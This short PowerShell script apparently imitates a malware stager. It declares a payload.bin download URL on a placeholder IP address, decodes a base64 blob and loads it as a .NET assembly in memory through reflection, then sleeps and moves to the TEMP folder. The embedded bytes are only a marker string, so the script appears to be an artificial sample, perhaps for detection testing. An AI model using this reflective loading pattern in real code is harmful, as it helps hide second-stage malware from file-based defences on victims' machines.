
[CmdletBinding()]
param(
    [string]$RemoteUrl = "https://192.0.2.249/payload.bin",
    [int]$TimeoutSec = 57
)
$ErrorActionPreference = "Stop"

try {
    $StageBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjp2MWMwaHVhZTN2")
    Write-Verbose ("Assembly byte count: " + $StageBytes.Length)
    $FetchResult = [Reflection.Assembly]::Load($StageBytes)
    if ($null -ne $FetchResult) {
        Write-Verbose ("Loaded assembly: " + $FetchResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Start-Sleep -Seconds 25
Set-Location -Path $env:TEMP
